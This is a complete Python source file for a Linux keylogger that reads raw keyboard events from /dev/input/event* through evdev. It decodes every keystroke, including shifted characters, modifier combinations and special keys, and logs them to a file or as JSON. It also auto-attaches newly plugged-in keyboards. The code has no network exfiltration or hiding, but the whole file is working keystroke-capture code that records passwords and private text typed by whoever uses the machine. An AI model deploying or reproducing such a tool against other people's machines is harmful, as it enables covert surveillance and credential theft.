#!/usr/bin/env python3
"""Linux keyboard logger using evdev.

Reads keyboard events directly from /dev/input/event* and appends decoded
keystrokes to a log file. Requires read access to the input devices, which
normally means running as root or as a member of the input group.
"""

from __future__ import annotations

import argparse
import glob
import json
import os
import select
import sys
import time
from datetime import datetime, timezone

try:
    import evdev
    from evdev import ecodes
except ImportError as exc:
    raise SystemExit(
        "python3-evdev is required: sudo apt install python3-evdev"
    ) from exc


def _k(name: str) -> int:
    return getattr(ecodes, name)


SHIFT_CODES = {_k("KEY_LEFTSHIFT"), _k("KEY_RIGHTSHIFT")}
CTRL_CODES = {_k("KEY_LEFTCTRL"), _k("KEY_RIGHTCTRL")}
ALT_CODES = {_k("KEY_LEFTALT"), _k("KEY_RIGHTALT")}
META_CODES = {_k("KEY_LEFTMETA"), _k("KEY_RIGHTMETA")}
MODIFIER_CODES = SHIFT_CODES | CTRL_CODES | ALT_CODES | META_CODES

LETTERS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
LETTER_CODES = {_k(f"KEY_{ch}") for ch in LETTERS}

CHAR_MAP: dict[int, tuple[str, str]] = {
    _k(f"KEY_{ch}"): (ch.lower(), ch) for ch in LETTERS
}
CHAR_MAP.update(
    {
        _k("KEY_1"): ("1", "!"),
        _k("KEY_2"): ("2", "@"),
        _k("KEY_3"): ("3", "#"),
        _k("KEY_4"): ("4", "$"),
        _k("KEY_5"): ("5", "%"),
        _k("KEY_6"): ("6", "^"),
        _k("KEY_7"): ("7", "&"),
        _k("KEY_8"): ("8", "*"),
        _k("KEY_9"): ("9", "("),
        _k("KEY_0"): ("0", ")"),
        _k("KEY_MINUS"): ("-", "_"),
        _k("KEY_EQUAL"): ("=", "+"),
        _k("KEY_LEFTBRACE"): ("[", "{"),
        _k("KEY_RIGHTBRACE"): ("]", "}"),
        _k("KEY_BACKSLASH"): ("\\", "|"),
        _k("KEY_102ND"): ("\\", "|"),
        _k("KEY_SEMICOLON"): (";", ":"),
        _k("KEY_APOSTROPHE"): ("'", '"'),
        _k("KEY_GRAVE"): ("`", "~"),
        _k("KEY_COMMA"): (",", "<"),
        _k("KEY_DOT"): (".", ">"),
        _k("KEY_SLASH"): ("/", "?"),
        _k("KEY_SPACE"): (" ", " "),
        # Keypad. NumLock state is not available from EV_KEY alone, so these
        # are decoded as their numeric/operator faces.
        _k("KEY_KP0"): ("0", "0"),
        _k("KEY_KP1"): ("1", "1"),
        _k("KEY_KP2"): ("2", "2"),
        _k("KEY_KP3"): ("3", "3"),
        _k("KEY_KP4"): ("4", "4"),
        _k("KEY_KP5"): ("5", "5"),
        _k("KEY_KP6"): ("6", "6"),
        _k("KEY_KP7"): ("7", "7"),
        _k("KEY_KP8"): ("8", "8"),
        _k("KEY_KP9"): ("9", "9"),
        _k("KEY_KPDOT"): (".", "."),
        _k("KEY_KPSLASH"): ("/", "/"),
        _k("KEY_KPASTERISK"): ("*", "*"),
        _k("KEY_KPMINUS"): ("-", "-"),
        _k("KEY_KPPLUS"): ("+", "+"),
        _k("KEY_KPEQUAL"): ("=", "="),
        _k("KEY_KPCOMMA"): (",", ","),
        _k("KEY_KPLEFTPAREN"): ("(", "("),
        _k("KEY_KPRIGHTPAREN"): (")", ")"),
    }
)

_SPECIAL_NAMES = (
    "ESC", "DELETE", "INSERT", "HOME", "END", "PAGEUP", "PAGEDOWN",
    "UP", "DOWN", "LEFT", "RIGHT", "CAPSLOCK", "NUMLOCK", "SCROLLLOCK",
    "SYSRQ", "PAUSE", "MENU", "COMPOSE", "PRINT", "SLEEP", "WAKEUP",
    "POWER", "VOLUMEUP", "VOLUMEDOWN", "MUTE", "PLAYPAUSE", "NEXTSONG",
    "PREVIOUSSONG", "STOPCD", "CALC", "MAIL", "HOMEPAGE", "SEARCH",
    "BACK", "FORWARD", "REFRESH", "STOP", "FAVORITES", "REPLY",
    "SENDFILE", "SAVE", "DOCUMENTS", "BATTERY", "BLUETOOTH", "WLAN",
    "BRIGHTNESSUP", "BRIGHTNESSDOWN", "KBDILLUMTOGGLE", "KBDILLUMDOWN",
    "KBDILLUMUP", "CYCLEWINDOWS", "SWITCHVIDEOMODE", "DISPLAY_OFF",
    "MICMUTE", "MODE", "TV", "AUDIO", "VIDEO", "MEDIA",
)
_SPECIAL_NAMES += tuple(f"F{i}" for i in range(1, 25))

SPECIAL_MAP: dict[int, str] = {}
for _name in _SPECIAL_NAMES:
    _code = getattr(ecodes, f"KEY_{_name}", None)
    if _code is not None and _code not in CHAR_MAP:
        SPECIAL_MAP.setdefault(_code, _name)


def key_name(code: int) -> str:
    """Return a stable KEY_* name for an input key code."""
    name = ecodes.KEY.get(code)
    if isinstance(name, tuple):
        name = next(
            (item for item in name if item != "KEY_MIN_INTERESTING"),
            name[0],
        )
    return name or f"KEY_{code}"


class Decoder:
    """Turn EV_KEY code/value pairs into typed text or printable markers."""

    def __init__(self) -> None:
        self._pressed: set[int] = set()
        self.capslock = False

    def reset(self) -> None:
        self._pressed.clear()

    def _mods(self) -> list[str]:
        mods: list[str] = []
        if self._pressed & CTRL_CODES:
            mods.append("CTRL")
        if self._pressed & ALT_CODES:
            mods.append("ALT")
        if self._pressed & META_CODES:
            mods.append("META")
        if self._pressed & SHIFT_CODES:
            mods.append("SHIFT")
        return mods

    @staticmethod
    def _combined(mods: list[str], label: str) -> str:
        return "[" + "+".join(mods + [label]) + "]"

    def feed(self, code: int, value: int) -> str | None:
        """Consume one EV_KEY event and return output text, if any."""
        name = key_name(code)

        if value == 0:
            self._pressed.discard(code)
            return None

        if code in MODIFIER_CODES:
            if value == 1:
                self._pressed.add(code)
            return None

        if code == ecodes.KEY_CAPSLOCK:
            if value == 1:
                self.capslock = not self.capslock
                return "[CAPSLOCK]"
            return None

        mods = self._mods()
        combo = bool(self._pressed & (CTRL_CODES | ALT_CODES | META_CODES))

        if code in CHAR_MAP:
            if combo:
                label = name[4:] if name.startswith("KEY_") else name
                return self._combined(mods, label)
            base, shifted = CHAR_MAP[code]
            use_shift = bool(self._pressed & SHIFT_CODES)
            if code in LETTER_CODES:
                use_shift ^= self.capslock
            return shifted if use_shift else base

        if code in (_k("KEY_ENTER"), _k("KEY_KPENTER")):
            return self._combined(mods, "ENTER") if mods else "\n"
        if code == _k("KEY_TAB"):
            return self._combined(mods, "TAB") if mods else "\t"
        if code == _k("KEY_BACKSPACE"):
            return self._combined(mods, "BACKSPACE") if mods else "[BACKSPACE]"

        label = SPECIAL_MAP.get(code)
        if label is None:
            if name == "KEY_RESERVED" or name.startswith("BTN_"):
                return None
            label = name[4:] if name.startswith("KEY_") else name

        return self._combined(mods, label) if mods else f"[{label}]"


KEYBOARD_PROBE = {
    _k("KEY_A"),
    _k("KEY_Z"),
    _k("KEY_SPACE"),
    _k("KEY_ENTER"),
    _k("KEY_LEFTSHIFT"),
}


def is_keyboard(dev: evdev.InputDevice) -> bool:
    try:
        caps = dev.capabilities(verbose=False)
    except OSError:
        return False
    keys = set(caps.get(ecodes.EV_KEY, ()))
    return len(keys & KEYBOARD_PROBE) >= 3


def discover(paths: list[str] | None = None) -> tuple[list[evdev.InputDevice], list[tuple[str, str]]]:
    candidates = list(paths) if paths else sorted(glob.glob("/dev/input/event*"))
    devices: list[evdev.InputDevice] = []
    errors: list[tuple[str, str]] = []
    seen: set[str] = set()

    for path in candidates:
        real = os.path.realpath(path)
        if real in seen:
            continue
        seen.add(real)

        try:
            dev = evdev.InputDevice(path, readonly=True)
        except PermissionError:
            errors.append((path, "permission denied"))
            continue
        except OSError as exc:
            errors.append((path, str(exc)))
            continue

        try:
            if is_keyboard(dev):
                devices.append(dev)
            else:
                dev.close()
        except Exception:
            dev.close()
            raise

    return devices, errors


def cmd_list(paths: list[str] | None) -> int:
    devices, errors = discover(paths)
    for dev in devices:
        print(f"{dev.path}\t{dev.name}\t{dev.phys}")
        dev.close()
    for path, error in errors:
        print(f"{path}\t{error}", file=sys.stderr)
    if not devices:
        print(
            "No accessible keyboard devices. Run as root or grant read access "
            "to /dev/input/event*.",
            file=sys.stderr,
        )
        return 1
    return 0


def open_output(path: str):
    if path == "-":
        return sys.stdout, False

    path = os.path.expanduser(path)
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)
    try:
        os.fchmod(fd, 0o600)
    except OSError:
        pass
    return os.fdopen(fd, "a", encoding="utf-8", buffering=1), True


def emit_text(out, text: str, timestamp: bool) -> None:
    if timestamp:
        now = datetime.now().astimezone().isoformat(timespec="milliseconds")
        out.write(f"[{now}] ")
    out.write(text)
    out.flush()


def emit_raw(out, dev: evdev.InputDevice, event: evdev.InputEvent, text: str | None) -> None:
    ts = event.timestamp()
    record = {
        "time": datetime.fromtimestamp(ts, timezone.utc).isoformat(timespec="microseconds"),
        "epoch": round(ts, 6),
        "device": str(dev.path),
        "name": dev.name,
        "code": event.code,
        "key": key_name(event.code),
        "value": event.value,
        "text": text,
    }
    out.write(json.dumps(record, ensure_ascii=False) + "\n")
    out.flush()


def run(args: argparse.Namespace) -> int:
    try:
        out, close_out = open_output(args.output)
    except OSError as exc:
        print(f"cannot open output {args.output!r}: {exc}", file=sys.stderr)
        return 1

    devices, errors = discover(args.device)
    reported_errors: set[tuple[str, str]] = set()
    for path, error in errors:
        print(f"warning: {path}: {error}", file=sys.stderr)
        reported_errors.add((path, error))

    if not devices:
        print(
            "No accessible keyboard devices found. Run as root or grant read "
            "access to /dev/input/event*.",
            file=sys.stderr,
        )
        if close_out:
            out.close()
        return 1

    decoder = Decoder()
    by_fd = {dev.fd: dev for dev in devices}
    for dev in devices:
        print(f"capturing: {dev.path} ({dev.name})", file=sys.stderr)
    print(f"writing to: {args.output}", file=sys.stderr)

    last_scan = time.monotonic()

    try:
        while True:
            if args.scan_interval > 0:
                elapsed = time.monotonic() - last_scan
                timeout = max(0.0, args.scan_interval - elapsed)
            else:
                timeout = None

            try:
                readable, _, _ = select.select(list(by_fd), [], [], timeout)
            except InterruptedError:
                continue

            for fd in readable:
                dev = by_fd.get(fd)
                if dev is None:
                    continue
                try:
                    for event in dev.read():
                        if event.type != ecodes.EV_KEY:
                            continue
                        text = decoder.feed(event.code, event.value)
                        if args.raw:
                            emit_raw(out, dev, event, text)
                        elif text:
                            emit_text(out, text, args.timestamp)
                except BlockingIOError:
                    continue
                except OSError as exc:
                    print(f"device removed: {dev.path} ({exc})", file=sys.stderr)
                    try:
                        dev.close()
                    except OSError:
                        pass
                    by_fd.pop(fd, None)
                    decoder.reset()

            if args.scan_interval > 0 and time.monotonic() - last_scan >= args.scan_interval:
                last_scan = time.monotonic()
                new_devices, scan_errors = discover(args.device)
                known = {os.path.realpath(str(d.path)) for d in by_fd.values()}

                for path, error in scan_errors:
                    key = (path, error)
                    if key not in reported_errors:
                        print(f"warning: {path}: {error}", file=sys.stderr)
                        reported_errors.add(key)

                for dev in new_devices:
                    real = os.path.realpath(str(dev.path))
                    if real in known:
                        dev.close()
                        continue
                    by_fd[dev.fd] = dev
                    known.add(real)
                    print(f"attached: {dev.path} ({dev.name})", file=sys.stderr)

    except KeyboardInterrupt:
        print("\nstopped", file=sys.stderr)
    finally:
        for dev in list(by_fd.values()):
            try:
                dev.close()
            except OSError:
                pass
        if close_out:
            out.close()

    return 0


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Log Linux keyboard events from /dev/input/event*."
    )
    parser.add_argument(
        "-o",
        "--output",
        default="keylog.txt",
        help="output file, or '-' for stdout (default: keylog.txt)",
    )
    parser.add_argument(
        "-d",
        "--device",
        action="append",
        metavar="PATH",
        help="event device to read; repeatable (default: auto-detect)",
    )
    parser.add_argument(
        "--raw",
        action="store_true",
        help="write one JSON object per EV_KEY event",
    )
    parser.add_argument(
        "--timestamp",
        action="store_true",
        help="prefix decoded text with local timestamps",
    )
    parser.add_argument(
        "--list",
        action="store_true",
        help="list detected keyboard devices and exit",
    )
    parser.add_argument(
        "--scan-interval",
        type=float,
        default=5.0,
        metavar="SEC",
        help="device rescan interval; 0 disables (default: 5)",
    )
    return parser.parse_args(argv)


def main(argv: list[str] | None = None) -> int:
    args = parse_args(argv)
    if args.scan_interval < 0:
        args.scan_interval = 0
    if args.list:
        return cmd_list(args.device)
    return run(args)


if __name__ == "__main__":
    raise SystemExit(main())
